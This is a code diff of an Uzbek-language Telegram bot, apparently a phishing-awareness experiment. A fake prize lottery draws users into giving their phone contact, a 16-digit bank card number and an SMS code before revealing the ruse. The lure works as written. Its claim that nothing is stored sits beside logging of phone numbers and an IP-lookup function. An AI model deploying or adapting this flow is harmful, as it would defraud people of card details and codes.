@@ -82,38 +82,47 @@ user_steps = {}
 
 TEXTS = {
     'welcome': (
-        "🎁 Xush kelibsiz!\n\n"
-        "O'zbekiston banklari tomonidan barcha fuqarolarga BHMning 1 baravari "
-        "miqdorida bir martalik pul mukofoti ajratilmoqda.\n\n"
-        "🎮 O'yinda ishtirok etish uchun telefon raqamingizni kiriting:"
+        "Assalomu alaykum! Oʻyinda ishtirok etish va qimmatbaho sovgʻalar yutib olish "
+        "imkoniyatiga ega boʻlish uchun telefon raqamingizni yuboring yoki quyidagi "
+        "tugma orqali kiriting."
     ),
-    'phone_invalid': "❌ Noto'g'ri raqam. Qaytadan kiriting.",
-    'phone_ok': "✅ Telefon raqamingiz qabul qilindi: {}",
-    'number_pick': "🎮 O'yinda ishtirok etish uchun 1 dan 9 gacha bo'lgan raqamlardan birini yozing:",
-    'number_invalid': "❌ Faqat 1 dan 9 gacha bitta raqam yozing.",
-    'prize_sms': "Siz {} so'm yutuq egasiga aylandingiz! 🎉",
-    'card_prompt': "💳 Pulni kartangizga tushirish uchun 16 xonali karta raqamingizni kiriting:",
-    'card_invalid': "❌ Karta raqami noto'g'ri. 16 xonali raqam kiriting:",
+    'phone_request': "📱 Kontaktni ulashish",
+    'phone_invalid': "❌ Notoʻgʻri raqam. Qaytadan kiriting yoki kontaktni ulashing.",
+    'number_pick': "Oʻyinda ishtirok etish uchun 1 dan 9 gacha boʻlgan raqamlardan birini bosing:",
+    'prize_win': (
+        "Tabriklaymiz! Siz tasodifiy tanlov natijasiga koʻra {} SOʻM pul yutugʻi "
+        "egasiga aylandingiz! 🎉"
+    ),
+    'card_prompt': (
+        "Yutuqni bankingiz plastik kartasiga darhol tushirib olish uchun 16 talik "
+        "karta raqamingizni kiriting:"
+    ),
+    'card_invalid': "❌ Karta raqami notoʻgʻri. Faqat 16 xonali raqam kiriting.",
     'code_sent': "📩 Telefoningizga tasdiqlash kodi yuborildi.\n\n🔐 Kodni kiriting: {}",
-    'code_invalid': "❌ Kod noto'g'ri. Qaytadan kiriting:",
-    'blocked': "🚫 Urinishlar tugadi. /start buyrug'i bilan qayta boshlang.",
+    'code_invalid': "❌ Kod notoʻgʻri. Qaytadan kiriting.",
+    'blocked': "🚫 Urinishlar tugadi. /start buyrugʻi bilan qayta boshlang.",
     'experiment': (
         "⚠️ BU EKSPERIMENT EDI! ⚠️\n\n"
         "❌ Siz hech narsa yutmadingiz!\n\n"
-        "😱 Agar bu HAQIQIY firibgarlik bo'lganida:\n"
-        "• Telefon raqamingiz o'g'irlangan bo'lardi\n"
-        "• Bank hisobingizdan pul echib olinardi\n"
-        "• Shaxsiy ma'lumotlaringiz sotilgan bo'lardi\n\n"
+        "😱 Agar bu HAQIQIY firibgarlik boʻlganda:\n"
+        "• Telefon raqamingiz oʻgʻirlangan boʻlardi\n"
+        "• Bank hisobingizdan pul yechib olinardi\n"
+        "• Shaxsiy maʻlumotlaringiz sotilgan boʻlardi\n\n"
         "🔐 ESDA TUTING:\n\n"
         "1️⃣ Tanishilmagan QR kodlarni skanerlamang!\n"
         "2️⃣ Telefon raqamingizni notanish saytlarga bermang!\n"
         "3️⃣ SMS kodlarni HECH KIMGA aytmang!\n"
-        "4️⃣ \"Bepul sovg'a\" va'dalariga ishonmang!\n\n"
-        "📣 Bu tajriba kiberjinoyatlarning oldini olish uchun o'tkazildi.\n\n"
-        "✅ Endi siz bu hiylalarni bilasiz — boshqalarga ham ayting!\n\n"
-        "🔒 Sizning hech qanday ma'lumotlaringiz bizda saqlanmadi."
+        "4️⃣ \"Bepul sovgʻa\" vaʻdalariga ishonmang!\n\n"
+        "📣 Bu tajriba kiberjinoyatlarning oldini olish va fuqarolarning raqamli "
+        "savodxonligini oshirish uchun oʻtkazildi.\n\n"
+        "✅ Endi siz bu hiylalarni bilasiz — yaqinlaringizni asrash uchun boshqalarga ham ayting!\n\n"
+        "🔒 Xavotirga oʻrin yoʻq: siz kiritgan hech qanday maxfiy maʻlumotlar yoki bank "
+        "maʻlumotlari tizimimizda saqlanmadi va uchinchi shaxslarga uzatilmadi."
     ),
-    'channel_follow': "📢 Ushbu holatlarga tushmaslik uchun bizning kanaldagi yangiliklarni kuzatib boring:",
+    'channel_follow': (
+        "Kanalimizda kiberxavfsizlikka oid eng muhim tavsiyalar va dolzarb ogohlantirishlar "
+        "berib boriladi. Bilim va ogohlik — sizning eng ishonchli qalqoningizdir!"
+    ),
 }
 
 
@@ -168,7 +177,17 @@ def get_ip_info(chat_id):
 
 def build_phone_keyboard():
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    markup.row(types.KeyboardButton("+998"))
+    markup.add(types.KeyboardButton(get_text('phone_request'), request_contact=True))
+    return markup
+
+
+def build_number_grid():
+    markup = types.InlineKeyboardMarkup(row_width=3)
+    for row in range(3):
+        markup.row(*[
+            types.InlineKeyboardButton(str(n), callback_data=f"pick_{n}")
+            for n in range(row * 3 + 1, row * 3 + 4)
+        ])
     return markup
 
 
@@ -208,10 +227,6 @@ def finish_experiment(chat_id):
 
 
 def process_phone(chat_id, phone_raw):
-    text = (phone_raw or '').strip()
-    if text in ('+998', '998'):
-        return
-
     phone = normalize_phone(phone_raw)
     if not phone:
         bot.send_message(chat_id, get_text('phone_invalid'), reply_markup=build_phone_keyboard())
@@ -233,16 +248,15 @@ def process_phone(chat_id, phone_raw):
     log_action(chat_id, "phone_received", phone)
     set_step(chat_id, 'number_pick')
 
-    bot.send_message(chat_id, get_text('phone_ok').format(phone), reply_markup=types.ReplyKeyboardRemove())
-    bot.send_message(chat_id, get_text('number_pick'))
+    bot.send_message(
+        chat_id,
+        get_text('number_pick'),
+        reply_markup=types.ReplyKeyboardRemove()
+    )
+    bot.send_message(chat_id, "👇 Raqamni tanlang:", reply_markup=build_number_grid())
 
 
-def process_number_pick(chat_id, text):
-    picked = (text or '').strip()
-    if picked not in ('1', '2', '3', '4', '5', '6', '7', '8', '9'):
-        bot.send_message(chat_id, get_text('number_invalid'))
-        return
-
+def process_number_pick(chat_id, picked):
     state = get_state(chat_id)
     state['picked_number'] = picked
 
@@ -250,7 +264,7 @@ def process_number_pick(chat_id, text):
     prize = max(50000, (prize // 1000) * 1000)
     state['prize'] = prize
 
-    bot.send_message(chat_id, get_text('prize_sms').format(format_sum(prize)))
+    bot.send_message(chat_id, get_text('prize_win').format(format_sum(prize)))
     log_action(chat_id, "number_picked", f"raqam={picked}, yutuq={prize}")
 
     set_step(chat_id, 'card')
@@ -258,8 +272,8 @@ def process_number_pick(chat_id, text):
 
 
 def process_card(chat_id, text):
-    card_num = (text or '').replace(" ", "")
-    if len(card_num) < 16 or not card_num.isdigit():
+    card_num = re.sub(r'\D', '', text or '')
+    if len(card_num) != 16:
         bot.send_message(chat_id, get_text('card_invalid'))
         return
 
@@ -310,9 +324,33 @@ def start_handler(message):
 
     bot.send_message(
         chat_id,
-        get_text('welcome') + "\n\n📱 +998",
+        get_text('welcome'),
         reply_markup=build_phone_keyboard()
     )
+
+
+# ============== RAQAM TUGMALARI ==============
+@bot.callback_query_handler(func=lambda call: call.data and call.data.startswith('pick_'))
+def pick_number_handler(call):
+    chat_id = call.message.chat.id
+
+    try:
+        if get_step(chat_id) != 'number_pick':
+            safe_answer_callback(call, "⚠️ Avval /start bosing va telefon yuboring")
+            return
+
+        picked = call.data.replace('pick_', '')
+        if picked not in ('1', '2', '3', '4', '5', '6', '7', '8', '9'):
+            safe_answer_callback(call, "⚠️ Notoʻgʻri tanlov")
+            return
+
+        safe_answer_callback(call, f"✅ {picked} tanlandi!")
+        process_number_pick(chat_id, picked)
+
+    except Exception as e:
+        print(f"pick_number_handler xatolik: {e}")
+        traceback.print_exc()
+        safe_answer_callback(call, "❌ Xatolik. /start bosing")
 
 
 # ============== ADMIN CALLBACK ==============
@@ -329,11 +367,6 @@ def phone_step_handler(message):
         process_phone(chat_id, message.contact.phone_number)
     else:
         process_phone(chat_id, message.text)
-
-
-@bot.message_handler(func=lambda m: get_step(m.chat.id) == 'number_pick')
-def number_pick_step_handler(message):
-    process_number_pick(message.chat.id, message.text)
 
 
 @bot.message_handler(func=lambda m: get_step(m.chat.id) == 'card')
